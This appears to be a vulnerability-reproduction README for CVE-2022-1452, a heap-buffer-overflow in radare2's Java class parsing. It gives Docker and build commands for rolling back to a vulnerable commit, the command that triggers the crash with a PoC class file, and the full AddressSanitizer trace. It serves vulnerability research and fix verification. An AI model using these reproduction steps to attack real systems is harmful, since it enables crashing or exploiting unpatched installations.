### CVE-2022-1452

### PoC Links
[Huntr.dev](https://huntr.dev/bounties/c8f4c2de-7d96-4ad4-857a-c099effca2d6/)

### Docker Container Run Command
```shell
docker build -t cve-2022-1452-poc . / bash start.sh
docker run -itd --name CVE-2022-1452-POC cve-2022-1452-poc
docker exec -it CVE-2022-1452-POC /bin/bash
```

### PoC Reproduce Command
```shell
# Install the compilation and installation dependencies
apt update -y
apt install gcc wget curl git pkg-config make clang libtool-bin build-essential llvm-dev libunwind-dev -y

# Configure local SSH for Github and clone the repository. (ssh-keygen)
git clone git@github.com:radareorg/radare2.git

# Rollback to the vulnerable version.
cd radare2/
git reset --hard 14189710859c27981adb4c2c2aed2863c1859ec5

# Configure, compile, and install radare2.
# build the radare2 with address sanitizer
export CFLAGS=" -fsanitize=address "; export CXXFLAGS=" -fsanitize=address "; export LDFLAGS=" -fsanitize=address ";
CFGARG=" --enable-shared=no " PREFIX=`realpath install` bash sys/build.sh

# disable some features of address sanitizer to avoid false positives
export ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:symbolize=0:allocator_may_return_null=1:detect_odr_violation=0

./configure && make
make install
ldconfig

# trigger the poc
radare2 -A -q /poc/bootstrap.class

```

### Description
Observed that:
```
=================================================================
==43010==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xffffa7e74537 at pc 0xffffafc0c120 bp 0xffffd2bdd890 sp 0xffffd2bdd8a0
READ of size 1 at 0xffffa7e74537 thread T0
#0 0xffffafc0c11c  (/usr/local/lib/libr_asm.so+0xebc11c)
#1 0xffffafbe0df8  (/usr/local/lib/libr_asm.so+0xe90df8)
#2 0xffffafbe097c  (/usr/local/lib/libr_asm.so+0xe9097c)
#3 0xffffafbe2940  (/usr/local/lib/libr_asm.so+0xe92940)
#4 0xffffafbe3a88  (/usr/local/lib/libr_asm.so+0xe93a88)
#5 0xffffafbe348c  (/usr/local/lib/libr_asm.so+0xe9348c)
#6 0xffffafbe9c94  (/usr/local/lib/libr_asm.so+0xe99c94)
#7 0xffffadfc6b90  (/usr/local/lib/libr_bin.so+0x206b90)
#8 0xffffaded4fe4  (/usr/local/lib/libr_bin.so+0x114fe4)
#9 0xffffadecfa94  (/usr/local/lib/libr_bin.so+0x10fa94)
#10 0xffffadeac194  (/usr/local/lib/libr_bin.so+0xec194)
#11 0xffffadeac8a8  (/usr/local/lib/libr_bin.so+0xec8a8)
#12 0xffffae8684c8  (/usr/local/lib/libr_core.so+0x3884c8)
#13 0xffffae869e30  (/usr/local/lib/libr_core.so+0x389e30)
#14 0xffffb13ee2ac  (/usr/local/lib/libr_main.so+0x4e2ac)
#15 0xaaaad7d4e2dc  (/usr/local/bin/radare2+0x12dc)
#16 0xffffb12173f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8)
#17 0xffffb12174c8  (/lib/aarch64-linux-gnu/libc.so.6+0x274c8)
#18 0xaaaad7d4ddec  (/usr/local/bin/radare2+0xdec)

0xffffa7e74537 is located 0 bytes to the right of 7-byte region [0xffffa7e74530,0xffffa7e74537)
allocated by thread T0 here:
#0 0xffffb195a4b4  (/lib/aarch64-linux-gnu/libasan.so.6+0xaa4b4)
#1 0xffffafbdfcf4  (/usr/local/lib/libr_asm.so+0xe8fcf4)
#2 0xffffafbe093c  (/usr/local/lib/libr_asm.so+0xe9093c)
#3 0xffffafbe2940  (/usr/local/lib/libr_asm.so+0xe92940)
#4 0xffffafbe3a88  (/usr/local/lib/libr_asm.so+0xe93a88)
#5 0xffffafbe348c  (/usr/local/lib/libr_asm.so+0xe9348c)
#6 0xffffafbe9c94  (/usr/local/lib/libr_asm.so+0xe99c94)
#7 0xffffadfc6b90  (/usr/local/lib/libr_bin.so+0x206b90)
#8 0xffffaded4fe4  (/usr/local/lib/libr_bin.so+0x114fe4)
#9 0xffffadecfa94  (/usr/local/lib/libr_bin.so+0x10fa94)
#10 0xffffadeac194  (/usr/local/lib/libr_bin.so+0xec194)
#11 0xffffadeac8a8  (/usr/local/lib/libr_bin.so+0xec8a8)
#12 0xffffae8684c8  (/usr/local/lib/libr_core.so+0x3884c8)
#13 0xffffae869e30  (/usr/local/lib/libr_core.so+0x389e30)
#14 0xffffb13ee2ac  (/usr/local/lib/libr_main.so+0x4e2ac)
#15 0xaaaad7d4e2dc  (/usr/local/bin/radare2+0x12dc)
#16 0xffffb12173f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8)
#17 0xffffb12174c8  (/lib/aarch64-linux-gnu/libc.so.6+0x274c8)
#18 0xaaaad7d4ddec  (/usr/local/bin/radare2+0xdec)

SUMMARY: AddressSanitizer: heap-buffer-overflow (/usr/local/lib/libr_asm.so+0xebc11c)
Shadow bytes around the buggy address:
0x200ff4fce850: fa fa 03 fa fa fa 03 fa fa fa 04 fa fa fa 04 fa
0x200ff4fce860: fa fa 04 fa fa fa 03 fa fa fa 04 fa fa fa 03 fa
0x200ff4fce870: fa fa 03 fa fa fa 03 fa fa fa 04 fa fa fa 03 fa
0x200ff4fce880: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff4fce890: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x200ff4fce8a0: fa fa fa fa fa fa[07]fa fa fa fd fd fa fa 05 fa
0x200ff4fce8b0: fa fa 05 fa fa fa 05 fa fa fa 05 fa fa fa 05 fa
0x200ff4fce8c0: fa fa 00 04 fa fa 05 fa fa fa fd fd fa fa 00 03
0x200ff4fce8d0: fa fa 05 fa fa fa fd fd fa fa 05 fa fa fa 00 01
0x200ff4fce8e0: fa fa 05 fa fa fa fd fd fa fa 05 fa fa fa 00 07
0x200ff4fce8f0: fa fa 05 fa fa fa fd fa fa fa fd fa fa fa fd fa
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable:           00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone:       fa
Freed heap region:       fd
Stack left redzone:      f1
Stack mid redzone:       f2
Stack right redzone:     f3
Stack after return:      f5
Stack use after scope:   f8
Global redzone:          f9
Global init order:       f6
Poisoned by user:        f7
Container overflow:      fc
Array cookie:            ac
Intra object redzone:    bb
ASan internal:           fe
Left alloca redzone:     ca
Right alloca redzone:    cb
Shadow gap:              cc
==43010==ABORTING
Aborted
```


